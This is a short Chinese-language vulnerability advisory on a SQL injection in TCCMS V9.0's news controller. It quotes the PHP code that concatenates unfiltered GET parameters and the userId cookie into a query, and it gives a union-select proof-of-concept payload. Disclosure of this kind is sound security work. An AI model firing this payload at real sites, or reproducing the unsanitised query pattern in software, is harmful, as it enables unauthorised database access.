# TCCMS V9.0 app/controller/news.class.php all函数导致SQL注入
---
### 1. 漏洞成因

在app/controller/news.class.php中all函数对参数过滤不严

```
public function all() {
    $this->userIsLogin ();
	$_Obj = M($this->objName);
	$categoryObj = M("category");
	$_Obj->pageSize = 20;
	$where = "1=1";
	$key = StringUtil::GetSQLValueString($_POST['key']);
	$cid = intval($_GET['cid']);
	if ($key != "") {
		$where .= " and title like '$key%'";
	}
	if (!empty($cid) && $cid != "") {
		$where .= " and classid = " . $cid;
	}
	if ($_GET["type"] == "user") {
		$where .= " and uid = " . $_COOKIE['userId'];
    }
	if (isset($_GET['yz'])) {
		$where .= " AND yz =".$_GET['yz'];
	}
	if (isset($_GET['levels'])) {
		$where .= " AND levels =".$_GET['levels'];
	}
	if (isset($_GET['special'])) {
		$where .= " AND special =".$_GET['special'];
	}
	if (isset($_GET['top'])) {
		$where .= " AND top =".$_GET['top'];
	}
	if (isset($_GET['flashpic'])) {
		$where .= " AND flashpic =".$_GET['flashpic'];
	}
	if (isset($_GET['isphoto'])) {
		$where .= " AND isphoto =".$_GET['isphoto'];
	}
	$_Obj->setSortId();
	$orderBy = $_GET['sortId'];
	$_objAry = $_Obj->where($where)->orderby("id ".$orderBy)->getList();
	$this->setValue("categoryObj", $categoryObj);
	$this->setValue("objAry", $_objAry);
	$this->setValue("Obj", $_Obj);
	$this->setValue("action", "list");
	$this->forward("user/newsList.html");
}
```

这里从get和cookie里获取了很多参数，都没有进行过滤，这里只拿其中的$cookie['userId']来进行测试，其他参数同理

### 2.漏洞验证
poc:

```
union select concat(floor(rand(0)*2),md5(1)),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
```
![](http://images.sebug.net/contribute/1f583546-ded2-4555-bf37-50ae08942b39-tccms2.png)

### 3. 影响版本

TCCMS V9.0

### 4. 漏洞防护方案

升级版本